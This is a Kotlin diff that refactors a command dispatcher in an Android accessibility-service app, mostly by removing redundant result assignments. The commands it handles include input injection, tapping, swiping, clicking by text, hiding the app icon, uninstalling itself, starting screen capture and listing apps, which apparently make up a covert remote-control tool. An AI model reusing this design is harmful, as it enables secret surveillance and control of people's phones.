@@ -45,7 +45,6 @@ object MacroRunner {
                     result = service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
                 } else {
                     result = false
-                    return false
                 }
             }
             "wait" -> {
@@ -62,11 +61,9 @@ object MacroRunner {
                         service.runOnMainThreadSync { service.tap(x, y) }
                         result = true
                     } else {
-                        result = false
                         return false
                     }
                 } else {
-                    result = false
                     return false
                 }
             }
@@ -76,7 +73,6 @@ object MacroRunner {
                     service.runOnMainThreadSync { service.injectText(text) }
                     result = true
                 } else {
-                    result = false
                     return false
                 }
             }
@@ -92,60 +88,47 @@ object MacroRunner {
                         service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
                         result = true
                     } else {
-                        result = false
                         return false
                     }
                 } else {
-                    result = false
                     return false
                 }
             }
             "click_text" -> {
                 val text = step.data as? String
                 if (text != null) {
-                    result = service.runOnMainThreadSync {
+                    result = service.runOnMainThreadSync run@{
                         val root = service.rootInActiveWindow
                         for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
                             if (node.isClickable) {
                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                                return@runOnMainThreadSync true
+                                return@run true
                             }
                         }
-                        return@runOnMainThreadSync false
+                        return@run false
                     } as Boolean
                 } else {
-                    result = false
                     return false
                 }
             }
             "home" -> {
-                service.runOnMainThreadSync {
-                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME)
-                }
+                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_HOME) }
                 result = true
             }
             "back" -> {
-                service.runOnMainThreadSync {
-                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK)
-                }
+                service.runOnMainThreadSync { service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK) }
                 result = true
             }
             "hide_activity" -> {
-                service.runOnMainThreadSync {
-                    service.hideAppIcon()
-                }
+                service.runOnMainThreadSync { service.hideAppIcon() }
                 result = true
             }
             "uninstall" -> {
-                service.runOnMainThreadSync {
-                    service.uninstallSelf()
-                }
+                service.runOnMainThreadSync { service.uninstallSelf() }
                 result = true
             }
             "start_screen_capture" -> {
-                service.runOnMainThreadSync {
-                    service.startScreenCapture()
-                }
+                service.runOnMainThreadSync { service.startScreenCapture() }
                 result = true
             }
             "get_apps" -> {
@@ -163,12 +146,10 @@ object MacroRunner {
                     }
                     result = true
                 } else {
-                    result = false
                     return false
                 }
             }
             else -> {
-                result = false
                 return false
             }
         }
